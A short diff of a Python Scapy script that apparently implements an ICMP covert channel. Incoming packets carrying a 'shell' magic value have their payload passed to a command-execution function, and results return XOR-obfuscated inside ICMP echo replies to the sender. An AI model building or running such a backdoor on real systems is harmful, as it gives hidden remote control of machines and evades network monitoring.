@@ -43,12 +43,11 @@ def action(pkt):
 				print "Port"
 			elif buff[4:8] == shell:
 				time.sleep(0.1)
-				command_shell(buff[8:])
+				command_shell(buff[8:], source)
 				print "Sending reply"
 
-def packet_builder(data):
-	print source
-	packet = Ether() / IP(dst=source) / ICMP(type=0) / (XOR(server_magic + data))
+def packet_builder(data, dst):
+	packet = Ether() / IP(dst=dst) / ICMP(type=0) / (XOR(server_magic + data))
 	return packet
 
 def XOR(p):
